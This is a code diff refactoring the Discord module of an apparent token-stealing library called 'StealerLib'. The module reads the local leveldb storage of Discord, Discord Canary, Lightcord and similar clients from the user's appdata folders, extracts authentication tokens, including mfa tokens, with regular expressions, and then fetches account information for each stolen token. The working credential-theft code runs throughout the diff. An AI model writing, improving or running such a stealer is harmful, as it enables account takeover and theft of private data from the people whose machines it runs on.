@@ -24,8 +24,8 @@ class Discord:
         accounts    A list of account information collected from each Discord token stored in a list of values or a StealerLib object
         roaming     The path to the local roaming folder
         appdata     The path to the local appdata folder
-        paths       A dictionary of file paths where Discord tokens are stored
-        available   A list of file paths that exist on the local machine (derived from self.paths)
+        locations   A dictionary of file paths where Discord tokens are stored
+        available   A list of file paths that exist on the local machine (derived from self.locations)
     """
 
     def __init__(self):
@@ -33,7 +33,7 @@ class Discord:
         self.accounts = []
         self.roaming = roaming = os.getenv("appdata")
         self.appdata = appdata = os.getenv("localappdata")
-        self.paths = {
+        self.locations = {
             'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
             'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
@@ -75,7 +75,7 @@ class Discord:
         """
 
         available_paths = []
-        for path in self.paths.values():
+        for path in self.locations.values():
             if not os.path.exists(path):
                 continue
             available_paths.append(path)
@@ -91,28 +91,32 @@ class Discord:
 
         Parameters:
             self (object): The object passed to the method
-            conv (bool): Boolean whether to append the data as a converted value or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted value or a StealerLib object
 
         Returns:
-            list: A list of scraped Discord tokens from the machine
+            list: A list of scraped Discord tokens from the machine as plaintext or a StealerLib object
         """
 
-        def_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
         enc_regex = r"mfa\.[\w-]{84}"
+        def_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+
+        strip_lines = lambda path, file: [
+            line.strip()
+            for line in open(f"{path}\\{file}", errors="ignore").readlines()
+            if line.strip()
+        ]
 
         for path in self.available:
             for file in os.listdir(path):
                 if not file.endswith(".log") and not file.endswith(".ldb"):
                     continue
-                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for line in strip_lines(path, file):
                     for regex in (def_regex, enc_regex):
                         for token in re.findall(regex, line):
-                            if token in self.tokens:
-                                continue
-
-                            self.tokens.append(
-                                token if conv else DiscordTypes.Token(token) 
-                            )
+                            if token not in self.tokens:
+                                self.tokens.append(
+                                    token if conv else DiscordTypes.Token(token) 
+                                )
 
         return self.tokens
 
@@ -128,10 +132,10 @@ class Discord:
         Parameters:
             self (object): The object passed to the method
             tokens (list): A list of plaintext tokens or DiscordTypes.Token objects to get the information of
-            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
-            list: A list containing each tokens account information, stored in another list or a StealerLib Object
+            list: A list containing each tokens account information, stored in another list or a StealerLib object
         """
 
         for token in tokens:
@@ -139,9 +143,9 @@ class Discord:
                 token = DiscordTypes.Token(token)
 
             obj_account = token.get_information()
-            obj_account = obj_account.conv() if conv else obj_account
-
-            self.accounts.append(obj_account)
+            self.accounts.append(
+                obj_account.conv() if conv else obj_account
+            )
 
         return self.accounts
 
